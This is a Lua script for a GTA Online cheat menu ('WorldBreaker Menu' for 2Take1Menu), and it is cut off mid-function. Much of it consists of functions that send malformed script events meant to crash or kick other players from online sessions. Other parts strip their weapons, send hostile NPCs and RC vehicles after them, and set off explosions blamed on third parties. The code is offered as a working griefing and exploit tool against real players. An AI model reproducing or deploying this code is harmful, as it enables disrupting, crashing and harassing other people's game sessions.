breakerMenu = menu.add_player_feature("α WorldBreaker Menu Ω", "parent", 0).id
breakerMenuMain = menu.add_feature("α WorldBreaker Menu Ω", "parent", 0).id

local Root = utils.get_appdata_path("PopstarDevs", "2Take1Menu")


local pedLocals = player.get_player_ped(player.player_id())
local req, opt, popt, Paths, data, kick_param, kick_param_data = {}, {}, {}, {}, {}, {}, {}
Paths.Root = utils.get_appdata_path("PopstarDevs", "2Take1Menu")
Paths.kickdata = Paths.Root  .. "\\scripts\\WB_cfg\\WB_Kicks.ini"
Paths.kickparam = Paths.Root .. "\\scripts\\WB_cfg\\WB_KickParam.ini"
Functions = Paths.Root .. "\\scripts\\WB_cfg\\WB_Functions.lua"

guns = {
   "0x92A27487",
    "0x958A4A8F",
    "0xF9E6AA4B",
    "0x84BD7BFD",
    "0x8BB05FD7",
    "0x440E4788",
    "0x4E875F73",
    "0xF9DCBF2D",
    "0xD8DF3C3C",
    "0x99B507EA",
    "0xDD5DF8D9",
    "0xDFE37640",
    "0x678B81B1",
    "0x19044EE0",
    "0xCD274149",
    "0x94117305",
    "0x3813FC08",
    "0x1B06D571",
    "0xBFE256D4",
    "0x5EF9FEC4",
    "0x22D8FE39",
    "0x3656C8C1",
    "0x99AEEB3B",
    "0xBFD21232",
    "0x88374054",
    "0xD205520E",
    "0x83839C4",
    "0x47757124",
    "0xDC4DB296",
    "0xC1B3C3D1",
    "0xCB96392F",
    "0x97EA20B8",
    "0xAF3696A1",
    "0x2B5EF5EC",
    "0x917F6C8C",
	"0x13532244",
    "0x2BE6766B",
    "0x78A97CD0",
    "0xEFE7E2DF",
    "0xA3D4D34",
    "0xDB1AA450",
    "0xBD248B55",
    "0x476BF155",
    "0x1D073A89",
    "0x555AF99A",
    "0x7846A318",
    "0xE284C527",
    "0x9D61E50F",
    "0xA89CB99E",
    "0x3AABBBAA",
    "0xEF951FBB",
    "0x12E82D3D",
    "0xBFEFFF6D",
    "0x394F415C",
    "0x83BF0278",
    "0xFAD1F1C9",
    "0xAF113F99",
    "0xC0A3098D",
    "0x969C3D67",
    "0x7F229F94",
    "0x84D6FAFD",
    "0x624FE830",
    "0x9D07F764",
    "0x7FD62962",
    "0xDBBD7280",
    "0x61012683",
    "0x5FC3C11",
    "0xC472FE2",
    "0xA914799",
    "0xC734385A",
    "0x6A6C02E0",
    "0xB1CA77B1",
    "0xA284510B",
    "0x4DD2DC56",
    "0x42BF8A85",
    "0x7F7497E5",
    "0x6D544C99",
    "0x63AB0442",
    "0x781FE4A",
    "0xB62D1F67",
    "0x93E220BD",
    "0xA0973D5E",
    "0xFDBC8A50",
    "0x497FACC3",
    "0x24B17070",
    "0x2C3731D9",
    "0xAB564B93",
    "0x787F0BB",
    "0xBA45E8B8",
    "0x23C9F95C",
    "0x34A67B97",
    "0x60EC506",
    "0xFBAB5776",
    "0xBA536372"
  }

opt.opption = menu.add_feature("Alt Godmode/OTR","parent",breakerMenuMain).id
opt.wopption = menu.add_feature("Weapon Options","parent",breakerMenuMain).id
opt.sopption = menu.add_feature("WB Settings","parent",breakerMenuMain).id
opt.util = menu.add_feature("Utilities","parent",breakerMenuMain).id
popt.opption = menu.add_player_feature("Crashes/Kicks","parent",breakerMenu).id
popt.loops = menu.add_player_feature("Malicious Loops","parent",breakerMenu).id
popt.trolls = menu.add_player_feature("All Trolls","parent",breakerMenu).id
popt.attach = menu.add_player_feature("Attachment Trolling","parent",breakerMenu).id


vehicleNearByStorage = {}
lastNotify = 0




function Functionss()
if not utils.file_exists(Functions) then return end
f = assert(loadfile(Functions)) return f()
end
Functionss()

--\\Loading part of Moists kick data
function dataload()
if not utils.file_exists(Paths.kickdata) then	return end
for line in io.lines(Paths.kickdata) do data[#data + 1] = line end
end
dataload()

--\\Loading part of Moists kick data
function paramload()
if not utils.file_exists(Paths.kickparam) then	return end
for line in io.lines(Paths.kickparam) do
	kick_param_data[#kick_param_data + 1] = line
end
end
paramload()

function dupe_param()
for i =1, #kick_param_data do
	for y = 1, #kick_param_data do
		kick_param[y] = kick_param_data[i]
	end
end
end
dupe_param()

function build_params(argcnt)
local ParaMs = {}
for i = 1, argcnt do
	local y = math.random(1, #kick_param_data)
	ParaMs[i] = kick_param_data[y]
end
return ParaMs
end

menu.add_player_feature("Invalid World Object Attachment", "action", popt.opption, function(playerfeat, pid)
	menu.create_thread(IWOAttatch, {pid = pid})
end)


menu.add_player_feature("Ped Pool Fill Crash", "action", popt.opption, function(k,pid)
	menu.create_thread(pedFill, {pid = pid})
end)

menu.add_player_feature("Give Pizza", "action", popt.opption, function(val, pid)
	streaming.request_model(gameplay.get_hash_key("prop_pizza_box_03"))
	wrld = object.create_world_object(gameplay.get_hash_key("prop_pizza_box_03"), player.get_player_coords(pid), true, false)
	system.wait(10000)
	entity.delete_entity(wrld)

end)

function Osiris_kick(pid)
script.trigger_script_event(-2043109205, pid, {0, 0, 17302, 9822, 1999, 6777888, 111222}) script.trigger_script_event(-2043109205, pid, {0, 0, 2327, 0, 0, 0, -307, 27777}) script.trigger_script_event(-988842806, pid, {0, 0, 2327, 0, 0, 0, -307, 27777}) script.trigger_script_event(-2043109205, pid, {0, 0, 27983, 7601, 1020, 3209051, 111222}) script.trigger_script_event(-2043109205, pid, {0, 0, 1010, 0, 0, 0, -2653, 50555}) script.trigger_script_event(-988842806, pid, {0, 0, 1111, 0, 0, 0, -5621, 57766}) script.trigger_script_event(-988842806, pid, {0, 0, -3, -90, -123, -9856, -97652}) script.trigger_script_event(-2043109205, pid, {0, 0, -3, -90, -123, -9856, -97652}) script.trigger_script_event(-1881357102, pid, {0, 0, -3, -90, -123, -9856, -97652}) script.trigger_script_event(-988842806, pid, {0, 0, 20547, 1058, 1245, 2721936, 666333}) system.wait(25) script.trigger_script_event(-2043109205, pid, {0, 0, 20547, 1058, 1245, 2721936, 666333}) script.trigger_script_event(-1881357102, pid, {0, 0, 20547, 1058, 1245, 2721936, 666333}) script.trigger_script_event(153488394, pid, {0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144}) script.trigger_script_event(153488394, pid, {0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144}) script.trigger_script_event(1249026189, pid, {0, 0, 97587, 5697, 3211, 8237539, 967853}) script.trigger_script_event(1033875141, pid, {0, 0, 0, 1967}) script.trigger_script_event(1033875141, pid, {0, 0, -123, -957, -14, -1908, -123}) script.trigger_script_event(1033875141, pid, {0, 0, 12121, 9756, 7609, 1111111, 789666}) script.trigger_script_event(315658550, pid, {0, 0, 87111, 5782, 9999, 3333333, 888888}) script.trigger_script_event(-877212109, pid, {0, 0, 87111, 5782, 9999, 3333333, 888888}) script.trigger_script_event(1926582096, pid, {0, -1, -1, -1, 18899, 1011, 3070}) script.trigger_script_event(1926582096, pid, {0, -4640169, 0, 0, 0, -36565476, -53105203}) script.trigger_script_event(1033875141, pid, {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}) script.trigger_script_event(-988842806, pid, {0, 0, 93}) system.wait(25) script.trigger_script_event(-2043109205, pid, {0, 0, 37, 0, -7}) script.trigger_script_event(-1881357102, pid, {0, 0, -13, 0, 0, 0, 23}) script.trigger_script_event(153488394, pid, {0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27}) script.trigger_script_event(1249026189, pid, {}) script.trigger_script_event(315658550, pid, {}) script.trigger_script_event(-877212109, pid, {}) script.trigger_script_event(1033875141, pid, {0, 0, 0, 82}) script.trigger_script_event(1926582096, pid, {}) script.trigger_script_event(-977515445, pid, {26770, 95398, 98426, -24591, 47901, -64814}) script.trigger_script_event(-1949011582, pid, {pid, -1139568479, math.random(0, 4), math.random(0, 1)}) system.wait(25) script.trigger_script_event(-2043109205, pid, {0, 0, 3333, 0, 0, 0, -987, 21369}) script.trigger_script_event(-988842806, pid, {0, 0, 2222, 0, 0, 0, -109, 73322}) script.trigger_script_event(-977515445, pid, {26770, 95398, 98426, -24591, 47901, -64814}) script.trigger_script_event(-1949011582, pid,{pid, -1139568479, math.random(0, 4), math.random(0, 1)}) script.trigger_script_event(-1730227041, pid, {-494, 1526, 60541, -12988, -99097, -32105})end
function osiris_kick_v2(pid)
if network.network_is_host(player.player_id()) then
network.network_session_kick_player(pid)
end
end
function osiris_kick_v4(pid)
script.trigger_script_event(-720040631, pid, {}) script.trigger_script_event(1033875141, pid, {-17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691}) script.trigger_script_event(-81613951, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(-1292453789, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(1623637790, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(-1905128202, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(1160415507, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(-2120750352, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(0xe6116600, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) system.wait(50) script.trigger_script_event(-922075519, pid, {pid, 0, 0, 0, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, -1}) script.trigger_script_event(-1975590661, pid, {84857178, 61749268, -80053711, -78045655, 56341553, -78686524, -46044922, -22412109, 29388428, -56335450}) local pos = v3() pos = player.get_player_coords(pid) pos.x = math.floor(pos.x) pos.y = math.floor(pos.y) pos.z = math.floor(pos.z) script.trigger_script_event(-1975590661, pid, {pid, pos.x, pos.y, pos.z, 0, 0, 2147483647, 0, script.get_global_i(1590682 + (pid * 883) + 99 + 28), 1}) script.trigger_script_event(-1975590661, pid, {pid, pos.x, pos.y, pos.z, 0, 0, 1000, 0, script.get_global_i(1590682 + (pid * 883) + 99 + 28), 1}) script.trigger_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028}) script.trigger_script_event(-2120750352, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) script.trigger_script_event(-2122716210, pid, {91645, -99683, 1788, 60877, 55085, 72028}) script.trigger_script_event(0xE6116600, pid, {pid, script.get_global_i(1630317 + (1 + (pid * 595)) + 506)}) system.wait(50) script.trigger_script_event(0xB0886E20, pid, {0, 30583, 0, 0, 0, 1061578342, 1061578342, 4}) script.trigger_script_event(0xB0886E20, pid, {0, 30583, 0, 0, 0, 1061578342, 1061578342, 4}) script.trigger_script_event(0x9DB77399, pid, {50, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 999999999999999, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}) script.trigger_script_event(0x9DB77399, pid, {50, 50, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 999999999999999, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}) script.trigger_script_event(0xB0886E20, pid, {-1, 0, 0, 0}) script.trigger_script_event(0xB0886E20, pid, {0, -1, -1, 0}) script.trigger_script_event(0x9DB77399, pid, {-1, 0, -1, 0}) script.trigger_script_event(0xF5CB92DB, pid, {0, 0, 46190868, 0, 2}) script.trigger_script_event(0xF5CB92DB, pid, {46190868, 0, 46190868, 46190868, 2}) script.trigger_script_event(0xF5CB92DB, pid, {1337, -1, 1, 1, 0, 0, 0}) script.trigger_script_event(0xF5CB92DB, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
end

menu.add_player_feature("Osiris Kick", "action", popt.opption, function(feat, pid)
    Osiris_kick(pid)
	osiris_kick_v4(pid)
end)

menu.add_player_feature("Revive Crash", "action", popt.opption, function(feat, pid)
    script.trigger_script_event(-2043109205, pid, {0, 0, 30583, 0, 0, 0, -328966, -1933210564, 0})
end)



menu.add_player_feature("Moist Kick v1", "action", popt.opption, function(feat, pid)

        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
		script.trigger_script_event(2092565704, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
		script.trigger_script_event(2092565704, pid, {23135423, pid, 827870001, -1729222815, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})

end)

menu.add_player_feature("Moist Kick v2", "action", popt.opption, function(feat, pid)
    script.trigger_script_event(0x1d97a038, pid, {0, 0, 46190868, 0, 2})
    script.trigger_script_event(0x51ac3568, pid, {46190868, 0, 46190868, 46190868, 2})
    script.trigger_script_event(0x48276e68, pid, {1337, -1, 1, 1, 0, 0, 0})
    script.trigger_script_event(0x676680c7, pid, {pid, 1337, -1, 1, 1, 0, 0, 0})
    script.trigger_script_event(0x3935c307, pid, {-72614, 63007, 59027, -12012, -26996, 33399})
    script.trigger_script_event(0xb9102685, pid, {91645, -99683, 1788, 60877, 55085, 72028})
    script.trigger_script_event(2092565704, pid, {pid, script.get_global_i(1630816 + (1 + (pid * 597)) + 508)})
    script.trigger_script_event(0x7CBA04C8, pid, {pid, script.get_global_i(1630816 + (1 + (pid * 597)) + 508)})
    script.trigger_script_event(0x1ebe7832, pid, {-1, 500000, 849451549, -1, -1})
    script.trigger_script_event(0xdf8559f9, pid, {-1, 500000, 849451549, -1, -1})
    script.trigger_script_event(0x1cfa9df0, pid, {-1139568479, -1, 1, 100099})
    script.trigger_script_event(0xd8fae799, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
    script.trigger_script_event(0xb14e6c0c, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
    script.trigger_script_event(0xb939987b, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
end)

menu.add_player_feature("Modder Crash (M)", "action", popt.opption, function(feat, pid)

        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x9260c0a, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x8fdcc4d2, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x72d54f50, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0xcbb6ce33, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x3d9faec5, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x4a72a08d, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x8638a0ab, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x12d09136, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
        script.trigger_script_event(0x9260c0a, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x8fdcc4d2, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x72d54f50, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0xcbb6ce33, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x3d9faec5, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x4a72a08d, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x12d09136, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0xc50f74ca, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0x8638a0ab, pid, {pid, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
        script.trigger_script_event(0xc50f74ca, pid, {23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})

end)


menu.add_player_feature("Script Host Crash Kick (M)", "action", popt.opption, function(feat, pid)
        local SE_ARGS = build_params(20)
			system.wait(800)
        script.trigger_script_event(0x8fdcc4d2, pid, SE_ARGS)
        script.trigger_script_event(0x72d54f50, pid, SE_ARGS)
        script.trigger_script_event(0xcbb6ce33, pid, SE_ARGS)
        script.trigger_script_event(0x12d09136, pid, SE_ARGS)

end)


tbl_RemoteEvents={
	575344561,
	-588744584,
	59352546,
	600486780,
	608132931,
	-609583028,
	627052233,
	-639979452,
	649952111,

}
menu.add_player_feature("SE Kick 2", "action", popt.opption, function(feat, pid)
	if feat.on then
		--player.unset_player_as_modder(pid, -1)
		for i = 1, #tbl_RemoteEvents do
			par1 = kick_param_data[math.random(1, #kick_param_data)]
			par2 = kick_param_data[math.random(1, #kick_param_data)]
			par3 = kick_param_data[math.random(1, #kick_param_data)]
			par4 = kick_param_data[math.random(1, #kick_param_data)]
			par5 = kick_param_data[math.random(1, #kick_param_data)]
			par6 = kick_param_data[math.random(1, #kick_param_data)]
				system.yield(50)
			script.trigger_script_event(tbl_RemoteEvents[i], pid, {par3, par5, par2, par3, par2, par1, par3, par1})
				system.yield(50)
			script.trigger_script_event(tbl_RemoteEvents[i], pid, {par1, par4, par3, par5, par6, par2, par3, par2, par1, par3, par1})
				system.yield(50)
		end
		menu.notify("Script event kicks sent", "SE Test", 10, 2)
	end
end)

menu.add_player_feature("ScriptHost Fuckarino (M)", "toggle", popt.opption, function(feat, pid)
if feat.on then
	if player.is_player_valid(pid) then
		script.trigger_script_event(-877212109, pid, {91645, -99683, 1788, 60877, 55085, 72028})
		script.trigger_script_event(-877212109, pid, {91645, -99683, 1788, 60877, 55085, 72028})
		script.trigger_script_event(0x7cba04c8, pid, {pid, script.get_global_i(1630816 + (1 + (7 * 597)) + 508)})
		script.trigger_script_event(-877212109, pid, {-1, 500000, 849451549, -1, -1})
		script.trigger_script_event(315658550, pid, {-1, 500000, 849451549, -1, -1})
		script.trigger_script_event(-877212109, pid, {-1139568479, -1, 1, 100099})
		script.trigger_script_event(315658550, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
		script.trigger_script_event(-877212109, pid, {-1, -1, -1, -1, -1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
		script.trigger_script_event(315658550, pid, {-1139568479, -1, 1, 100099, -1, 500000, 849451549, -1, -1, 91645, -99683, 1788, 60877, 55085, 72028})
		system.yield(350)
	end
			

end
end)

seKicks={
	2092565704,
	1964309656,
	696123127,
	43922647,
	600486780,
	1954846099,
	153488394,
	1249026189,
	515799090,
	515799090,
	-1813981910,
	202252150,
	-19131151,
   	-635501849,
	1964309656,
	-988842806,
	-2043109205,
	1926582096
}

local smart = menu.add_player_feature("Smart Se Spam", "toggle", popt.opption, function(feat, pid)
	menu.create_thread(customSES, {val = feat, id = pid})
end)


menu.add_player_feature("Kick Data 1 Type 1 (M)", "toggle", popt.opption, function(feat, pid)
	if feat.on then
		--player.unset_player_as_modder(pid, -1)
		for i = 1, #data do
			par1 = math.random(-1000, 99999999)
			par2 = math.random(-99999999999999, -9)
			par3 = math.random(46190868, 999999999)
			par4 = math.random(-1, 9)
			par5 = math.random(-99999999999999, -46190868)
			par6 = math.random(9999999999, 9999999899990868)
				system.yield(50)
			script.trigger_script_event(data[i], pid, {par3, par5, par2, par3, par2, par1, par3, par1})
				system.yield(50)
			script.trigger_script_event(data[i], pid, {par1, par4, par3, par5, par6, par2, par3, par2, par1, par3, par1})
				system.yield(50)
		end

	end
end)

menu.add_player_feature("Kick Data 1 Type 2 (M)", "toggle", popt.opption, function(feat, pid)
	if feat.on then
		for i = 1, #data do
			par1 = kick_param_data[math.random(1, #kick_param_data)]
			par2 = kick_param_data[math.random(1, #kick_param_data)]
			par3 = kick_param_data[math.random(1, #kick_param_data)]
			par4 = kick_param_data[math.random(1, #kick_param_data)]
			par5 = kick_param_data[math.random(1, #kick_param_data)]
			par6 = kick_param_data[math.random(1, #kick_param_data)]
				system.yield(150)
			script.trigger_script_event(data[i], pid, {par3, par5, par2, par3, par2, par1, par3, par1})
				system.yield(150)
			script.trigger_script_event(data[i], pid, {par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par6, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par6, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par1, par5, par3, par6})
				system.yield1(50)
			script.trigger_script_event(data[i], pid, {par1, par4, par3, par5, par6, par2, par3, par2, par1, par3, par1})
				system.yield(150)
		end
	end
end)

menu.add_player_feature("Netbail Kick", "action", popt.opption, function(feat, pid)
	netbail(pid)
end)



menu.add_player_feature('Block - Passive', "action", popt.trolls, function(f, pid)
        script.trigger_script_event(1472357458, pid, {1, nil})
		script.trigger_script_event(1472357458, pid, {1, nil})
        menu.notify('Blocked Player from activating Passive.', 10, 2)
    end)

menu.add_player_feature('UN-Block - Passive', "action", popt.trolls, function(f, pid)
        script.trigger_script_event(1472357458, pid, {2, nil})
		script.trigger_script_event(1472357458, pid, {0, nil})
        menu.notify('UN-Blocked Player from Passive.', 10, 2)
    end)

menu.add_player_feature("Peaceful Player", "action", popt.trolls, function(playerfeat, pid)
	if true then 
		local pos = player.get_player_coords(pid)
		local playerPed = player.get_player_ped(pid)
		
		--entity.set_entity_coords_no_offset(pedLocals, pos)
		--ped.clear_ped_tasks_immediately(playerPed)
		
		for i = 1, #guns do
			local Y = guns[i]
			weapon.remove_weapon_from_ped(playerPed, Y)
			system.wait(1)
		end
		
		system.wait(1)
		
		--ped.clear_ped_tasks_immediately(playerPed)
		--network.request_control_of_entity(playerPed)
		--ai.task_play_anim(playerPed, "switch@trevor@jerking_off", "trev_jerking_off_loop", 1.0, 1.0, 8000, 1, 1.0, false, true, true)
		--network.send_chat_message("I cum in peace", false)
	end
end)


menu.add_player_feature("Cage 'Em", "action", popt.trolls, function(val, pid)
	ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
	system.wait(0)
	local pos = player.get_player_coords(pid)
    object.create_object(gameplay.get_hash_key("as_prop_as_target_scaffold_01a"), v3(pos.x, pos.y - .5, pos.z - .1), true, false)
end)



menu.add_player_feature("Send Hit Squad", "action", popt.trolls, function(playerfeat, pid)
    local hash = gameplay.get_hash_key("s_m_y_xmech_02")
      
    streaming.request_model(hash)
    while (not streaming.has_model_loaded(hash)) do
        system.wait(0)
    end
      
    for i = 1, 10 do
        local pos = entity.get_entity_coords(player.get_player_ped(pid))
        pos.x = pos.x + math.random(-20, 20+i)
        pos.y = pos.y + math.random(-20, 20)

		local Peds = ped.create_ped(29, hash, pos, 1.0, true, false)
		weapon.give_delayed_weapon_to_ped(Peds, 0x476BF155, 0, true)
		ped.set_ped_health(Peds, 410)
		ped.set_ped_combat_ability(Peds, 2)
		ped.set_ped_combat_attributes(Peds, 5, true)
		ai.task_combat_ped(Peds, player.get_player_ped(pid), 1, 16)
		ped.set_ped_relationship_group_hash(Peds, 0x84DCFAAD)
		gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(Peds), entity.get_entity_coords(Peds) + v3(0, 0.0, 0.1), 0, 453432689, player.get_player_ped(pid), false, true, 100)
		streaming.set_model_as_no_longer_needed(hash)   
	end
end)


Objs = {
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"10"
}
menu.add_player_feature("Stand Lua", "action_value_str", popt.trolls, function(val, pid)
	local num = Objs[val.value+1]
	local boomed = 0
	cars = {}
	drivers = {}
	seater(num, pid, "rcbandito")	
	while boomed < #cars do
		for i = 1, #cars do
			system.wait(500)
			local pos1 = player.get_player_coords(pid)
			local poss = v3(pos1.x + 3, pos1.y + 3, pos1.z + 5)
			local bpos = entity.get_entity_coords(cars[i])
			--menu.notify("Bandito Hunting", "Stand", 10, 2)
			if (bpos.x <= poss.x) and (bpos.y <= poss.y) and (bpos.z <= poss.z)  or (bpos.x >= poss.x) and (bpos.y >= poss.y) and (bpos.z >= poss.z)then
				fire.add_explosion(bpos, 0, true, false, 2.0, player.get_player_ped(pid))
				--vehicle.detonate_vehicle_phone_explosive_device()
				menu.notify("Bandito Exploding", "Stand", 5, 2)
				entity.delete_entity(drivers[i])
				entity.delete_entity(cars[i])
				boomed = boomed + 1
				--break
			end
			
			--break
		end
		--break
	end
end):set_str_data(Objs)

blamed = player.player_id()
menu.add_player_feature("Stand Lua Blamed: ", "action_value_str", popt.trolls, function(val, pid)
	local num = Objs[val.value+1]
	local boomed = 0
	cars = {}
	drivers = {}
	seater(num, pid, "rcbandito")	
	while boomed < #cars do
		for i = 1, #cars do
			system.wait(500)
			local pos1 = player.get_player_coords(pid)
			local poss = v3(pos1.x + 3, pos1.y + 3, pos1.z + 5)
			local bpos = entity.get_entity_coords(cars[i])
			if (bpos.x <= poss.x) and (bpos.y <= poss.y) and (bpos.z <= poss.z)  or (bpos.x >= poss.x) and (bpos.y >= poss.y) and (bpos.z >= poss.z)then
				fire.add_explosion(bpos, 0, true, false, 2.0, player.get_player_ped(blamed))
				menu.notify("Bandito Exploding", "Stand", 5, 2)
				entity.delete_entity(drivers[i])
				entity.delete_entity(cars[i])
				boomed = boomed + 1
			end
		end
	end
end):set_str_data(Objs)

menu.add_player_feature("Send RC Tanks: ", "action_value_str", popt.trolls, function(val, pid)
	local num = Objs[val.value+1]
	cars = {}
	drivers = {}
	seater(num, pid, "minitank")	
	for i = 1, #cars do
		while ped.get_ped_health(player.get_player_ped(pid)) > 0 do
			system.wait(500)
			local pos1 = player.get_player_coords(pid)
			local poss = v3(pos1.x + 20, pos1.y + 20, pos1.z + 50)
			local bpos = entity.get_entity_coords(cars[i])
			if (bpos.x <= poss.x) and (bpos.y <= poss.y) and (bpos.z <= poss.z)  or (bpos.x >= poss.x) and (bpos.y >= poss.y) and (bpos.z >= poss.z)then
				ai.task_vehicle_shoot_at_ped(drivers[i], player.get_player_ped(pid), 100.0)

			end
		end
		system.wait(1000)
		entity.delete_entity(drivers[i])
		entity.delete_entity(cars[i])
	end
end):set_str_data(Objs)



menu.add_player_feature("Update Players", "action", popt.trolls, function()
	PlayerArray()
	--orbital:set_str_data(Playerz)
	menu.notify("Playerlist Updated", "Update", 5, 2)
end)

orbital = menu.add_player_feature("Orbital Player Blaming: ", "action_value_str", popt.trolls, function(val, pid)
	local pos = v3()
	pped = player.get_player_ped(pid)
	for i = 0, 31 do
		if player.is_player_valid(i) and Playerz[val.value + 1] == player.get_player_name(i) then
			myped = player.get_player_ped(i)
			pos = entity.get_entity_coords(pped)
			offset = v3(0.0,0.0,-2000.00)
			script.get_global_f(1694982)
			graphics.set_next_ptfx_asset("scr_xm_orbital")
			while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
				graphics.request_named_ptfx_asset("scr_xm_orbital")
				system.wait(0)
			end
			ped.clear_ped_tasks_immediately(pped)
			gameplay.set_override_weather(3)
			gameplay.clear_cloud_hat()
			fire.add_explosion(pos, 59, true, false, 1.5, myped)
			fire.add_explosion(pos + offset, 60, true, false, 1.8, myped)
			fire.add_explosion(pos + offset, 62, true, false, 2.0, myped)
			fire.add_explosion(pos + v3(100.0,100.0,7000.00), 50, true, false, 1.0, myped)
			fire.add_explosion(pos, 50, true, false, 1.0, myped)
			graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 100.000, false, false, true)
			audio.play_sound_from_coord(-1, "BOATS_PLANES_HELIS_BOOM", v3(-910000.00,-10000.0,-19000.00), "MP_LOBBY_SOUNDS", true, 999999, false)
